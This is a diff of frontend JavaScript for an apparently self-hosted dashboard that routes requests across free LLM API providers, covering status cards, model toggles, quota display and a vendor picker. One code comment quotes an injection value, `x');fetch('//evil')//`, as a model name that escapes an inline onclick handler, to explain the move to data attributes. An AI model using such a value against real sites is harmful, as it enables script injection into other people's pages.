+    else if (enabledCount === 0) st = { cls: 'err', txt: '无可用模型' }
+    else if (rc && rc.n >= 3) {
+      // 3 次是下限：样本太少时一次失败就能把成功率打到 0，会把"刚接入还没跑过"误判成"这家坏了"
+      const rate = rc.ok / rc.n
+      // ⚠ 低成功率也给 **warn 不给 err**（2026-09-26 第八轮实测发现）：err 档的语义必须是
+      //   "这家用不了"（无可用模型 / Key 不可用）；而"近期失败多"的家照样有模型在池里、
+      //   auto 会自动少选它 —— 标红会让卡头汇总说出「3 不可用」，与卡片上的文案对不上，
+      //   而且 gemini / empero 明明各有 15 / 1 个可用模型，说"不可用"是错的。
+      st = rate < 0.5 ? { cls: 'warn', txt: '近 7 天多失败', rate }
+        : rate < 0.9 ? { cls: 'warn', txt: '偶发失败', rate }
+          : { cls: 'ok', txt: '正常', rate }
+    }
+    else if (!rc) st = { cls: 'idle', txt: '近期未使用' }
+    else st = { cls: 'ok', txt: '正常' }
+    PROV_STAT[st.cls] = (PROV_STAT[st.cls] || 0) + 1
+    // 状态点的 hover 说明：单看四个字判断不出严重程度，把"这要不要紧"讲清楚
+    let stTip = ''
+    if (st.cls === 'warn' && st.rate < 0.5) stTip = `近 7 天 ${rc.n} 次调用里失败 ${rc.err} 次（成功率 ${Math.round(st.rate * 100)}%）—— 这家近期确实不稳，auto 会自动少选它，暂时不需要手动干预。`
+    else if (st.cls === 'warn') stTip = `近 7 天 ${rc.n} 次调用里 ${rc.err} 次在上游失败（成功率 ${Math.round(st.rate * 100)}%）。auto 已自动回退到其他家，该家整体仍在正常服务 —— 上游 5xx / 429 属于常态，不需要处理。`
+    else if (st.cls === 'err' && p.accountIssue) stTip = '该 Key 当前看不到任何模型（上游 /v1/models 返回空列表，或整池 404/401），已整家暂停参与 auto 路由，未拉黑任何模型。修好 Key / 接入点后最多 6 小时自动恢复。'
+    else if (st.cls === 'err' && enabledCount === 0) stTip = '该家当前没有任何可用模型，已不参与 auto 路由 —— 展开卡片看具体原因。'
+    else if (st.cls === 'err') stTip = `近 7 天 ${rc.n} 次调用里失败 ${rc.err} 次（成功率 ${Math.round(rc.ok / rc.n * 100)}%）—— 这家近期确实不稳，auto 会自动少选它。`
+    else if (st.cls === 'idle') stTip = '近 7 天没有任何真实调用（auto 没选中它）—— 不是故障，只是没有样本；卡片里那条报错可能来自体检或目录扫描，不代表真实使用中的表现。'
+    else if (st.cls === 'cd') stTip = '冷却中：上游限流或额度用尽，到点会自动恢复。'
+
+    const nmFull = p.label || p.name || '?'
+    const letter = nmFull.trim()[0].toUpperCase()
+    // logo: 拿到本地缓存就显示, 否则走首字母方块。onerror 时回退到首字母 + 去掉 .l class,
+    // 即使本地文件被删/被改, 也不会显示破图占位。data-fb 把字母塞进 dataset, 避免 onerror 字符串字面量要双重转义。
+    const logo = VENDOR_LOGOS[p.name]
+    const offCls = p.enabled === false ? ' off' : ''
+    const avatarCls = 'avatar' + offCls + (logo ? ' l' : '')
+    const fb = esc(letter)
+    const avatarInner = logo
+      ? `<img src="/assets/logos/${esc(logo)}" alt="" loading="lazy" data-fb="${fb}" onerror="this.parentNode&&this.parentNode.classList.remove('l');this.replaceWith(document.createTextNode(this.dataset.fb||''))">`
+      : fb
+
+    const mpre = commonModelPrefix(live)
+    // ⚠ 刻意**不在 chip 上标"强/轻"能力档**：强不强由 auto 排序自己去判断就够了，标在页面上只会
+    // 让用户在挑模型时多一层犹豫（用户反馈："标记出来反而让人不好选择"）。判据仍在服务端
+    // pickChain 的 modelTier 里生效，只是不往界面上搬。
+    const chips = live.map((m) => {
+      const on = !dis.includes(m)
+      const shown = mpre ? m.slice(mpre.length) : m
+      return `<label class="mchip${on ? '' : ' off'}" title="${esc(m)}${on ? ' · 点击停用' : ' · 点击启用（即时生效）'}">`
+        + `<input type="checkbox" ${on ? 'checked' : ''} data-act="toggle-model" data-id="${esc(p.id)}" data-model="${esc(m)}"><span>${esc(shown)}</span></label>`
+    }).join('')
+
+    // 不在免费池的模型（已拉黑 / 已隔离）默认只留一行摘要，点开才展开 chip。
+    // 以前几十个 chip 直接铺在卡片里，把版面撑得又长又花 —— 现在只报"数量 + 原因"，要看细节再展开。
+    const dead = [
+      ...blk.map((m) => ({ m, kind: 'blk', r: (p.blocked[m] || {}).reason || '已拉黑' })),
+      ...qtn.map((m) => ({ m, kind: 'qtn', r: (p.quarantine[m] || {}).reason || '已隔离' })),
+    ]
+    const deadKey = 'dead-' + p.id
+    // 行上只留一个「不在池 N」（2026-09-25）：原来「已拉黑 N」「已隔离 N」两个徽标并排，再加上
+    // 免费策略徽标，一行能挂 4 个彩色块；实测 7 行里 6 行顶着「已隔离 26 / 32 / 18」这种大数字，
+    // 看着像"坏了一堆"，其实只是封闭名单外的模型（设计如此）。合并成一个、按严重程度取色、细节进 hover。
+    const deadTip = [blk.length ? `已拉黑 ${blk.length}` : '', qtn.length ? `已隔离 ${qtn.length}` : ''].filter(Boolean).join(' · ')
+      + '。这些模型不参与 auto 路由（封闭名单外 / 未通过免费体检 / 被手动停用），系统会自动复审、恢复即放回。展开卡片可逐个解除。'
+    const deadHtml = dead.length ? `
+      <div class="deadline">
+        <span>不在免费池</span>
+        ${blk.length ? `<span class="dchip blk">已拉黑 ${blk.length}</span>` : ''}
+        ${qtn.length ? `<span class="dchip">已隔离 ${qtn.length}</span>` : ''}
+        <span style="color:var(--faint)">自动复审，恢复即放回</span>
+        <a id="${deadKey}-t" data-act="toggle-box" data-key="${esc(deadKey)}" role="button" tabindex="0" style="color:var(--accent);cursor:pointer;text-decoration:none">展开</a>
+      </div>
+      <div class="deadbody" id="${deadKey}-b" style="display:none">
+        ${dead.map((d) => `<span class="chip ${d.kind}" title="${esc(d.r)}">${esc(d.m)}</span><button class="tiny" data-act="unblock" data-id="${esc(p.id)}" data-model="${esc(d.m)}">解除</button>`).join('')}
+        ${dead.length > 1 ? `<button class="tiny" data-act="unblock" data-id="${esc(p.id)}" data-model="">全部解除</button>` : ''}
+      </div>` : ''
+
+    // 免费策略（🛡 名单 N / 👁 视野免费）从供应商行搬到这里（2026-09-25）：它是稳定属性、几乎不变，
+    // 而那一行更需要把空间留给"现在能不能用"。展开卡片就能看到。
+    const policy = p.freePolicy === 'closed'
+      ? `<span title="免费模型以每日同步的封闭白名单为准，名单外一律不进池，防误判扣费">🛡 名单 ${p.freeListCount}</span>`
+      : p.freePolicy === 'open'
+        ? '<span title="免费 plan 的 Key 只能看到免费模型，可见即免费">👁 视野免费</span>'
+        : ''
+    const meta = [
+      esc((p.base_url || '').replace(/^https?:\/\//, '')),
+      p.needs_proxy ? '代理' : '',
+      p.keyCount > 1 ? `${p.keyCount} Keys` : '',
+      p.latency ? `${(p.latency / 1000).toFixed(1)}s` : '',
+    ].filter(Boolean).join('<i>·</i>')
+
+    const div = document.createElement('div')
+    div.className = 'prow' + (p.enabled === false ? ' dim' : '')
+    div.setAttribute('data-prov-id', p.id)
+    const provOpen = OPEN_PROV.has(p.id)
+    // ── 账号级无模型权限横幅 ──
+    // 与服务端 p.accountIssue 对应(见 server.mjs accountIssueActive)。触发条件很确定:
+    // 上游 /v1/models 返回空列表, 或整池模型同一轮全部 404/401。这两种都说明问题在
+    // **Key 或接入点**, 不在模型本身 —— 所以它和下面的「不在免费池(已隔离 N)」是两件事, 分开展示。
+    const accHtml = p.accountIssue
+      ? `<div class="accline">⚠ <b>该 Key 当前看不到任何模型</b>（${p.accountIssue.kind === 'no_models' ? '上游模型列表为空' : '整池模型全部 404/401'}）· 已整家暂停参与 auto 路由, 未拉黑任何模型 · 修好 Key / 接入点后最多 6 小时自动恢复<br><span style="color:var(--sub)">${esc(p.accountIssue.note || '')}</span></div>`
+      : ''
+    // 错误行的年龄: 只给提示, 不改写内容 —— 用户需要知道"这条是 4 天前的", 而不是以为刚发生
+    const errAgeMs = p.lastError ? (() => {
+      const m = String(p.lastError).match(/^(\d{4}-\d{2}-\d{2}T[\d:.]+Z)/)
+      return m ? Date.now() - new Date(m[1]).getTime() : null
+    })() : null
+    const errHtml = p.lastError
+      ? `<div class="errline">${esc(humanErr(p.lastError))}${(errAgeMs != null && errAgeMs > 6 * 3600000) ? `<span class="staleerr" title="这条报错之后该厂商一直没有成功过, 所以它一直挂在卡片上 —— 不代表现在仍在故障">· ${fmtAgo(errAgeMs)}前的记录，可能已过时</span>` : ''}</div>`
+      : ''
+    // 成败数（2026-09-26）：主信息位给**最近 7 天**（服务端 /api/state 的 p.recent，口径同
+    // 「模型使用记录」卡头）；p.ok / p.err 是全期累计（含早期调试），降级进 title。
+    // 实测这份日志里累计会**双向骗人**：openrouter 累计 392/131 看着优秀、近 7 天却只调过 1 次；
+    // gemini 累计 142/271 看着惨、近 7 天也确实 1/25 —— 用户点开卡片问的是"这家现在怎么样"。
+    // ⚠ 必须带上**次数**：否则 openrouter 的"成功 0 · 失败 1"会被读成"这家坏了"，
+    //   实际只是这 7 天几乎没被 auto 选中（它自己的状态点还是"正常"）。
+    const footHtml = (rc && rc.n)
+      ? `<span title="最近 7 天共 ${rc.n} 次调用。${FOOT_TIP}">近 7 天 ${rc.n} 次：<b>${rc.ok}</b> 成功 · <b>${rc.err}</b> 失败</span>`
+      : `<span title="最近 7 天没有调用记录。${FOOT_TIP}">近 7 天无调用</span>`
+    // ── 上游配额（"今天还剩多少"）──
+    // 免费池最大的焦虑就是"我还能用多久", 而以前只能等撞 429 才知道。服务端现在会把上游
+    // 响应头里的 `x-ratelimit-*` 采下来(见 server.mjs 的 recordQuota)。
+    // ⚠ 只有**真的回过配额头**的家才有这一项 —— 所以它天然是稀缺信号, 不会像"已隔离 N"
+    //   那样上到每一行就不再是信号(Groq / OpenRouter / Cerebras / Cloudflare 会回, 多数家不回)。
+    // ⚠ 超 24 小时不显示: 那时候它讲的不是"还剩多少", 是历史。宁可这一项消失, 也不给一个过期的数。
+    const q = p.quota
+    const qAge = (q && q.at) ? now - new Date(q.at).getTime() : null
+    let quotaHtml = ''
+    if (q && qAge != null && qAge >= 0 && qAge < 24 * 3600000) {
+      const seg = []
+      if (q.remainreq != null) seg.push(q.limitreq ? `剩余 <b>${q.remainreq}</b>/${q.limitreq} 次` : `剩余 <b>${q.remainreq}</b> 次`)
+      if (q.remaintok != null) seg.push(`token 剩 <b>${fmtBig(q.remaintok)}</b>`)
+      if (seg.length) {
+        const reset = q.resetreq != null ? ` · ${fmtDurSec(q.resetreq)}后重置` : ''
+        quotaHtml = `<span class="quota" title="上游响应头实测（${fmtAgo(qAge)}）。这是厂商自己报的剩余额度, 口径按各家 —— 有的按天、有的按分钟、有的按美元, 仅供参照。">⏳ ${seg.join(' · ')}${reset}</span>`
+      }
+    }
+    div.innerHTML = `
+      <div class="ptop">
+        <button class="prow-toggle${provOpen ? ' rot' : ''}" data-act="toggle-prov-body" data-id="${esc(p.id)}" aria-label="${provOpen ? '收起详情' : '展开详情'}" title="${provOpen ? '收起详情' : '展开详情（模型 chips / 错误 / 统计）'}">▼</button>
+        <span class="${avatarCls}">${avatarInner}</span>
+        <span class="nm">${esc(nmFull)}</span>
+        <span class="pstate ${st.cls}"${stTip ? ` title="${esc(stTip)}"` : ''}><span class="sdot ${st.cls}"></span>${st.txt}</span>
+        ${blk.length ? `<span class="badge mute" title="${esc(deadTip)}">已拉黑 ${blk.length}</span>` : ''}
+        <span class="pops">
+          <button class="small gray" data-act="test" data-id="${esc(p.id)}">测试</button>
+          <button class="small gray" data-act="check" data-id="${esc(p.id)}">体检</button>
+          <button class="small gray" data-act="keys" data-id="${esc(p.id)}">Keys${p.keyCount > 1 ? ` ${p.keyCount}` : ''}</button>
+          <button class="small gray" data-act="toggle-prov" data-id="${esc(p.id)}">${p.enabled === false ? '启用' : '停用'}</button>
+          <button class="small danger" data-act="del" data-id="${esc(p.id)}">删除</button>
+        </span>
+      </div>
+      <div class="prow-body"${provOpen ? '' : ' style="display:none"'}>
+        <div class="pmeta">${meta}${policy}</div>
+        <div class="pmodels"><span class="plabel">路由池 ${enabledCount}/${live.length}</span>${mpre ? `<span class="plabel" style="font-family:ui-monospace,Consolas,monospace" title="该家模型名的公共前缀，已从下方名字里省略">${esc(mpre)}</span>` : ''}${chips || '<span class="plabel">（无可用模型）</span>'}</div>
+        ${accHtml}
+        ${deadHtml}
+        ${errHtml}
+        <div class="pfoot">${footHtml}${p.lastUsed ? `<span>最近使用 <b>${fmtTime(p.lastUsed)}</b></span>` : ''}${quotaHtml}${sweepHtml}</div>
+      </div>`
+    el.appendChild(div)
+  })
+  // 总览: 只报非零项, 全正常时就是一句"7 家正常" —— 不铺陈、不占版面
+  const s = $('provsum')
+  if (s) {
+    const n = LAST.length
+    const parts = []
+    if (PROV_STAT.ok) parts.push(`${PROV_STAT.ok} 正常`)
+    if (PROV_STAT.warn) parts.push(`${PROV_STAT.warn} 有失败`)
+    if (PROV_STAT.idle) parts.push(`${PROV_STAT.idle} 近期未用`)
+    if (PROV_STAT.cd) parts.push(`${PROV_STAT.cd} 冷却`)
+    if (PROV_STAT.err) parts.push(`${PROV_STAT.err} 不可用`)
+    if (PROV_STAT.off) parts.push(`${PROV_STAT.off} 停用`)
+    s.textContent = `${n} 家 · ${parts.join(' · ')}`
+  }
+  restoreOpenBoxes(el)   // 重绘后恢复用户展开的「不在免费池」明细
+}
+// 通用折叠开关：约定 内容容器 id = `<key>-b`，开关链接 id = `<key>-t`。
+// 用在两处：「不在免费池的模型」和「已结束的限时活动」—— 这类明细铺开会把卡片撑爆。
+// ⚠ 展开态必须记在模块级 OPEN_BOX 里: refresh 每 8 秒全量重绘, 不记的话用户刚点开的
+// 明细会在下一次刷新时自己合上 —— 这是被反复抱怨过的点。
+const OPEN_BOX = new Set()
+function toggleBox(key){
+  const b = $(key + '-b'), a = $(key + '-t')
+  if (!b) return
+  const open = b.style.display !== 'none'
+  b.style.display = open ? 'none' : ''
+  // data-nolabel: 文案本身已带含义（如目录里的「排除 26 个」），不该被改写成"展开/收起"
+  if (a && !a.dataset.nolabel) a.textContent = open ? '展开' : '收起'
+  if (open) OPEN_BOX.delete(key); else OPEN_BOX.add(key)
+}
+// 重绘后按 OPEN_BOX 恢复折叠块状态。必须在每次 innerHTML 重建之后调用。
+function restoreOpenBoxes(root){
+  const scope = root || document
+  scope.querySelectorAll('[id$="-b"]').forEach((b) => {
+    const key = b.id.slice(0, -2)
+    if (!OPEN_BOX.has(key)) return
+    b.style.display = ''
+    const a = $(key + '-t'); if (a && !a.dataset.nolabel) a.textContent = '收起'
+  })
+}
+// 供应商详情折叠态: 默认收起, 点 ▼ 才展开。同套防丢原理 —— refresh 全量重绘,
+// 不记的话用户刚展开的会在下次刷新合上。
+const OPEN_PROV = new Set()
+function toggleProvBody(id){
+  const prov = document.querySelector(`[data-prov-id="${CSS.escape(id)}"]`)
+  if (!prov) return
+  const body = prov.querySelector('.prow-body')
+  const btn = prov.querySelector('.prow-toggle')
+  if (!body) return
+  const open = body.style.display !== 'none'
+  body.style.display = open ? 'none' : ''
+  if (btn) {
+    btn.classList.toggle('rot', !open)
+    btn.setAttribute('aria-label', open ? '展开详情' : '收起详情')
+    btn.setAttribute('title', open ? '展开详情（模型 chips / 错误 / 统计）' : '收起详情')
+  }
+  if (open) OPEN_PROV.delete(id); else OPEN_PROV.add(id)
+}
+
+// ── 事件委托 ─────────────────────────────────────────────────────
+// 所有"由服务端数据驱动"的控件都走 data-act, 不再拼内联 onclick。
+// 为什么必须这样: 模型名/厂商名来自上游, 早期被拼进 `onclick="f('${esc(m)}')"` 的
+// JS 字符串里 —— esc 只负责 HTML 转义, 挡不住闭合引号; 上游把模型名起成
+// `x');fetch('//evil')//` 就是一条注入路径。改成 data-* 后属性值只做 HTML 转义,
+// 永远不进入 JS 解析, 注入面从根上消失。
+function onAct(act, el, ev){
+  const id = el.dataset.id || ''
+  switch (act) {
+    case 'toggle-box': ev.preventDefault(); return toggleBox(el.dataset.key || '')
+    case 'toggle-prov-body': return toggleProvBody(el.dataset.id || '')
+    case 'view': return switchView(el.dataset.view || 'dash')
+    case 'pick-preset': return pickPreset(el.dataset.name || '')
+    case 'avail-all': AVAIL_OPEN = true; return renderAvailable(LAST_WL)
+    case 'cand-all': CAND_OPEN = !CAND_OPEN; return renderCandidates(LAST_WL)
+    case 'pick-candidate': return pickCandidate(el.dataset.host || '')
+    case 'pick-avail': return pickAvail(el.dataset.host || '')
+    case 'expand-cat': return expandCat(Number(el.dataset.i))
+    case 'collapse-cat': return collapseCat(Number(el.dataset.i))
+    case 'test': return testOne(id)
+    case 'check': return checkOne(id)
+    case 'keys': return openKeysModal(id)
+    case 'toggle-prov': return toggleOne(id)
+    case 'del': return delOne(id)
+    case 'unblock': return unblock(id, el.dataset.model || '')
+    case 'snippets': return openSnippets()
+    case 'snapshots': return openSnapshots()
+    case 'snap-save': return snapSave()
+    case 'snap-restore': return snapRestore(el.dataset.name || '')
+    case 'snap-del': return snapDel(el.dataset.name || '')
+    case 'snip-tab': return snipTab(el.dataset.k || '')
+    case 'copy-el': return copyRaw((($(el.dataset.el) || {}).textContent) || '', el.dataset.label || '已复制')
+    case 'close-modal': return closeModal()
+    case 'copy-text': return copyRaw(el.dataset.text || '', el.dataset.label || '已复制')
+    case 'keys-add': return keysAdd()
+    case 'keys-remove': return keysRemove(Number(el.dataset.idx))
+    case 'keys-toggle': return keysToggle(Number(el.dataset.idx), el.dataset.on === '1')
+    case 'keys-reset': return keysReset(Number(el.dataset.idx))
+    case 'confirm-yes': return runConfirm()
+    case 'play-run': return playRun()
+    case 'play-stop': return playStop()
+    case 'play-clear': return playClear()
+    case 'pg-fill': return pgFillPrompt(el.dataset.text || '')
+    default: return undefined
+  }
+}
+document.addEventListener('click', (e) => {
+  const el = e.target && e.target.closest ? e.target.closest('[data-act]') : null
+  if (!el) return
+  // label 里的 checkbox 交给 change 事件, 避免"点一下触发两次"
+  if (el.dataset.act === 'toggle-model') return
+  const r = onAct(el.dataset.act, el, e)
+  if (r && typeof r.catch === 'function') r.catch(() => {})
+})
+document.addEventListener('change', (e) => {
+  const el = e.target
+  if (el && el.dataset && el.dataset.act === 'toggle-model') toggleModel(el.dataset.id, el.dataset.model, el.checked)
+})
+// 键盘可达性: role=button 的元素按回车/空格等价于点一下
+// ⚠ ESC 必须在最前面判断: 早期写法是"先 return 掉非 Enter/Space 的键", 结果 ESC 永远
+// 走不到 closeModal(), 弹层只能靠点"关闭"按钮退出 —— 一个看起来正常、实际半残的交互。
+document.addEventListener('keydown', (e) => {
+  if (e.key === 'Escape') { if (MODAL_OPEN) closeModal(); return }
+  if (e.key !== 'Enter' && e.key !== ' ') return
+  const el = e.target
+  if (!el || !el.dataset || !el.dataset.act) return
+  if (el.tagName === 'BUTTON' || el.tagName === 'INPUT') return
+  // ⚠ pick-candidate / pick-avail 原来漏在这张表外：两处都有 role=button + tabindex=0，
+  //   键盘能聚焦却按不动，等于给了个假承诺。补上（2026-09-25）。
+  if (el.dataset.act === 'toggle-box' || el.dataset.act === 'pick-preset' || el.dataset.act === 'avail-all' ||
+      el.dataset.act === 'pick-candidate' || el.dataset.act === 'pick-avail' ||
+      el.dataset.act === 'expand-cat' || el.dataset.act === 'collapse-cat' || el.dataset.act === 'copy-text') {
+    e.preventDefault()
+    const r = onAct(el.dataset.act, el, e)
+    if (r && typeof r.catch === 'function') r.catch(() => {})
+  }
+})
+
+async function toggleModel(id, model, on){
+  const r = await api(`/api/providers/${id}/modeltoggle`, { method:'POST', headers:{'content-type':'application/json'}, body:JSON.stringify({ model, enabled:on }) })
+  if (r.ok) toast(on ? '已启用' : '已停用', model + (on ? '，已加入路由' : '，不再参与路由'), 'ok', 2500)
+  else toast('操作失败', r.error || '未知错误', 'err')
+  refresh()
+}
+
+// ── 厂商选择器 ────────────────────────────────────────────────
+// 自绘下拉替代原生 <select>：原生 option 塞不下状态徽标，一长串名字也很难扫。
+// 名单来自服务端每天推导的 presets，分四档；掉出免费的自动沉到最后一档，恢复了自己浮上来。
+const V_GROUPS = [
+  ['promo',   '限时免费中'],
+  ['free',    '免费可用'],
+  ['unknown', '待确认'],
+  ['paid',    '无免费档 · 每天自动复查'],
+]
+function vStateText(st){
+  if (!st) return '未知'
+  // "限时免费"这句的出处是**厂商公告页**, 不是我们实测 —— 明写出来, 免得被读成"你能用"。
+  if (st.state === 'promo') return st.basis === 'announcement' ? '公告页：限时免费' : '限时免费'
+  if (st.state === 'free') return `${st.count} 个免费`
+  if (st.state === 'unknown') return '待探测'
+  return '无免费档'
+}
+function toggleVpop(ev){
+  if (ev) ev.stopPropagation()
+  if (VOPEN) closeVpop(); else openVpop()
+}
+function openVpop(){
+  const pop = $('vpop'); if (!pop) return
+  pop.style.display = ''; VOPEN = true
+  if (!$('vsearch')) pop.innerHTML = '<input class="vsearch" id="vsearch" placeholder="搜索厂商 / 域名…" oninput="renderVlist(this.value)"><div id="vlist"></div>'
+  renderVlist(($('vsearch') || {}).value || '')
+  const s = $('vsearch'); if (s) s.focus()
+}
+function closeVpop(){
+  const pop = $('vpop'); if (pop) pop.style.display = 'none'
+  VOPEN = false
+}
+// 只重画列表、不重画搜索框 —— 否则每敲一个字输入框就重建，光标会丢
+function renderVlist(q){
+  const box = $('vlist'); if (!box) return
+  const kw = String(q || '').trim().toLowerCase()
+  const hit = PRESETS.filter((p) => !kw || `${p.label} ${p.name} ${p.host}`.toLowerCase().includes(kw))
+  let html = ''
+  for (const [k, title] of V_GROUPS) {
+    const list = hit.filter((p) => (p.status || {}).state === k)
+    if (!list.length) continue
+html += `<div class="grp">${title} · ${list.length}</div>` + list.map((p) => {
+    // 主显示备注 = 厂商接入点里的人工说明（"每月 1000 次免费"这类）；
+    // 该家当前没免费档时后端会换成动态状态说明，避免显示过期的额度描述误导
+    const note = (p.status && p.status.note) || ''
+    // hover 弹层：完整模型列表 + 完整备注 + 接入说明 —— 单行里截掉的部分在这里看全
+    const fullNote = (p.status && p.status.fullNote) || ''
+    // provisional = 厂商发现源(models.dev)刚捞到、只知标价 0、我们从没真调过。
+    // 必须一眼看出来: 否则用户会以为"名单里有 = 确认免费", 而它可能是 kenari.id 那种可疑数据。
+    const prov = !!(p.status && p.status.provisional)
+    const provTip = '厂商发现源新捞到的候选：只标明标价 0，我们还没真调过。添加后会走全池实测，实测不免费会自动拉黑。'
+    // 2026-09-19 取消"实测徽标"：用户原话"这后面不用加这种标签了吧, 显得好乱"。
+    // 域名 + 模型数 + 备注已经够, "真在跑 / 端点要 Key / 路径未探到" 属于内部状态,
+    // 漏到 UI 上是噪音。p.patrol 字段保留(诊断仍要用), 不再渲染。
+    const hoverBits = [fullNote, note, prov ? provTip : (p.known ? null : '白名单里新出现的厂商，接入点路径待探测')].filter(Boolean)
+    return `<div class="vopt" data-act="pick-preset" data-name="${esc(p.name)}" role="button" tabindex="0" title="${esc(hoverBits.join('\n') || p.label)}">`
+      + `<span class="vn">${esc(p.label)}</span>`
+      // 待实测比"新"更具体、更该被看见 —— 两者语义重叠时只显示前者, 避免一行挂两个徽标
+      + (prov ? `<span class="vs prov" title="${esc(provTip)}">待实测</span>`
+        : (p.known ? '' : '<span class="vs" title="白名单里新出现的厂商，接入点路径待探测">新</span>'))
+      + (note ? `<span class="vnote">${esc(note)}</span>` : '')
+      + `<span class="vh">${esc(p.host)}</span>`
+      // 「Key 当前不可用」: 厂商说有免费档(公告页/白名单), 但这个 Key 实测看不到任何模型。
+      // 与右边的免费状态**并列**而不是覆盖 —— 两件事都是真的, 只是说的不是一个主体。
+      + (p.accountIssue ? `<span class="vs keybad" title="${esc(p.accountIssue.note || '该 Key 当前看不到任何模型')}">你的 Key 不可用</span>` : '')
+      + `<span class="vs ${k}">${vStateText(p.status)}</span></div>`
+  }).join('')
+  }
+  box.innerHTML = html || '<div class="grp">没有匹配的厂商</div>'
+}
+function pickPreset(name){
+  const p = PRESETS.find((x) => x.name === name); if (!p) return
+  $('p_name').value = p.name
+  $('p_base').value = p.base_url
+  $('p_proxy').checked = !!p.needs_proxy
+  $('modellist').style.display = 'none'
+  const st = p.status || {}
+  $('vbtntxt').innerHTML = esc(p.label) + (st.state === 'free' ? ` <span style="color:var(--faint);font-size:var(--fs-1)">· ${st.count} 个免费</span>` : '')
+  closeVpop()
+  if (st.state === 'free' || st.state === 'promo') toast('已填入接入信息', '填好 API Key 后点「拉取免费模型」，再勾选要接入的模型', 'ok', 5000)
+  else toast('已填入接入信息', st.note || '该家当前白名单里没有免费模型（每天自动复查，恢复了会重新出现）', 'warn', 6000)
+}
+document.addEventListener('click', (e) => {
+  if (!VOPEN) return
+  const box = $('vpop'), btn = $('vbtn')
+  if (box && !box.contains(e.target) && btn && !btn.contains(e.target)) closeVpop()
+})
+
+let fetchedModels = []
+async function fetchFree(){
+  const body = { name:$('p_name').value.trim(), base_url:$('p_base').value.trim(), api_key:$('p_key').value.trim(), needs_proxy:$('p_proxy').checked }
+  if (!body.base_url || !body.api_key) { toast('请先填 Base URL 和 API Key','','warn'); return }
+  $('addmsg').innerHTML = '<span class="spin"></span> 正在拉取模型列表…'
+  const r = await api('/api/fetchfree', { method:'POST', headers:{'content-type':'application/json'}, body:JSON.stringify(body) })
+  if (!r.ok) { $('addmsg').textContent = ''; toast('拉取失败', r.error, 'err'); return }
+  fetchedModels = r.models
+  // 隐私提示: 若该厂商"所有"免费模型都会被上游记录 prompt(聚合网关的典型情况 —— 实测 Kilo 19/19),
+  // 就合并成一句话说明, 不给每个模型都挂同样的徽标: 整屏都是同一个警告时, 等于没有警告。
+  // 只有部分模型会记录时, 才逐个标注, 让用户能区分着勾选。
+  const logN = (r.models || []).filter((m) => m.log).length
+  const allLog = r.models.length > 0 && logN === r.models.length
+  let msg = r.note ? r.note : `可见 ${r.total} 个模型，${r.models.length} 个可接入的免费文字对话模型`
+  if (allLog) msg += `；⚠️ 这些模型的 prompt 会被上游记录用于改进服务，敏感或机密内容慎用`
+  else if (logN) msg += `；其中 ${logN} 个上游会记录 prompt（⚠️ 标记）`
+  $('addmsg').textContent = msg
+  const box = $('modelitems'); box.innerHTML = ''
+  $('modellist').style.display = 'block'
+  if (!r.models.length) {
+    box.innerHTML = '<div style="font-size:var(--fs-2);color:var(--warn);margin-bottom:8px">未识别出免费模型，可手动填写模型名（多个用逗号或空格分隔）。<br>注意：手动填写的模型无法自动核实是否免费，添加后会先被隔离、不参与 auto 路由（避免悄悄扣费）；确认免费后可在卡片上点「解除」放行。</div><input id="manual_model" placeholder="手动输入模型名，如 model-a, model-b">'
+    return
+  }
+  const sorted = [...r.models].sort((a,b) => (b.rec?1:0)-(a.rec?1:0))
+  sorted.forEach(m => {
+    const d = document.createElement('label'); d.className = 'mitem'
+    const tags = []
+    if (m.promo) tags.push(`<span class="badge promo" title="${esc(m.promo.note)}">⏳ ${m.promo.until ? '至 '+m.promo.until : '限时免费'}</span>`)
+    else if (m.rec) tags.push('<span class="badge rec">⭐ 推荐</span>')
+    // "免费"之外的两个关键信息: 勾选前必须看见, 所以做成独立徽标而不是埋在提示里
+    if (m.router) tags.push('<span class="badge rec" title="路由型模型：由厂商在内部转发到其它模型，实际用的是哪个不固定">🔀 路由</span>')
+    if (m.log && !allLog) tags.push('<span class="badge qtn" title="上游会记录你的 prompt 用于改进服务（Kilo / NVIDIA 等免费端点的条款），敏感或机密内容慎用">⚠️ 记录prompt</span>')
+    // 隐私风险只提示、不代劳: 勾选状态仍按推荐来, 要不要传敏感内容由用户自己判断 ——
+    // 一刀切地不勾选等于替用户禁用整个厂商(Kilo 19/19 都记录, 那样就一个都选不了)。
+    d.innerHTML = `<input type="checkbox" class="mchk" value="${esc(m.id)}" ${m.rec ? 'checked' : ''}><span class="id">${esc(m.id)}</span>${tags.join('')}`
+    box.appendChild(d)
+  })
+}
+function checkAll(v){ document.querySelectorAll('.mchk').forEach(c => c.checked = v) }
+function checkRec(){ document.querySelectorAll('.mchk').forEach(c => c.checked = c.parentElement.querySelector('.badge.rec') != null) }
+
+async function addProvider(){
+  const models = [...document.querySelectorAll('.mchk:checked')].map(c => c.value)
+  const mm = $('manual_model')
+  // 手动填写的模型名单独放 manual 字段: 它们没经过免费校验, 服务端会先隔离、不进 auto 池(防静默扣费)
+  const manual = mm && mm.value.trim() ? mm.value.trim().split(/[\s,，;；]+/).filter(Boolean) : []
+  if (!models.length && !manual.length) { toast('请先勾选模型或手动填写模型名','','warn'); return }
+  const body = { name:$('p_name').value.trim(), base_url:$('p_base').value.trim(), api_key:$('p_key').value.trim(), models, manual, needs_proxy:$('p_proxy').checked }
+  if (!body.name || !body.base_url || !body.api_key) { toast('name / Base URL / API Key 都要填','','warn'); return }
+  const r = await api('/api/providers', { method:'POST', headers:{'content-type':'application/json'}, body:JSON.stringify(body) })
+  if (r.ok) {
+    const un = r.unverified || []
+    if (un.length) toast('已添加，但有模型被隔离', `${body.name} · ${un.length} 个手动填写的模型未通过免费校验，已隔离、不会被 auto 调用：${un.join('、')}。若确认它们确实免费，可在供应商卡片上点「解除」。`, 'warn', 9000)
+    else toast('已添加', `${body.name} · ${models.length + manual.length} 个模型`)
+    $('p_key').value=''; $('modellist').style.display='none'; refresh()
+  }
+  else toast('添加失败', r.error || JSON.stringify(r), 'err')
+}
+
+// 删供应商走通用弹层而不是原生 confirm()：原生对话框会阻塞整个页面（轮询全停），
+// 而且样式不可控、在窄屏上还可能被浏览器拦。破坏性操作一律用 confirmModal。
+async function delOne(id){
+  const p = LAST.find(x => x.id === id)
+  const label = p ? (p.label || p.name) : id
+  confirmModal('删除供应商？',
+    `将移除「${label}」及其 ${p && p.keyCount ? p.keyCount : 1} 把 Key，该家所有模型立即退出 auto 路由。此操作不可撤销。`,
+    async () => {
+      const r = await api('/api/providers/' + id, { method: 'DELETE' })
